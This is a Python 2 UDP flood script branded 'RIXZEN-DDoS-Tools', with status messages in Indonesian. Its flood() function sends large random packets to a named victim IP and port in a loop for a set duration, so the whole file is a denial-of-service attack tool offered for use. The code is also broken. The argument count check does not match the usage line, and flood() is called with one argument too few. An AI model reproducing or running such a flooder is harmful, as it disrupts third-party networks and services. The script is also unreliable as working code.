import time
import socket
import random
import sys
def usage():
    print "######################################################################################"
    print "#                             RIXZEN-DDoS-Tools                                     ##"
    print "#Commands : python2 RixzenDDoSTools.py <ip> <port> <packet> <duration>              ##"
    print "#Creator  : Mr.Pack               ##      #      #                                  ##"
    print "#Team     : RixzenTeam            ##      #      #                                  ##"
    print "#Version  : 1.0                   ##      #      #                                  ##"
    print "#TQAdmin  : Mr.Pack, Mr.Mek, Mr.Tod                                                 ##"
    print "######################################################################################"
def flood(victim, vport, packet, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = packet
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
            client.sendto(bytes, (victim, vport))
            sent = sent + 1
            print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket ke ip: \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
if __name__ == '__main__':
    main()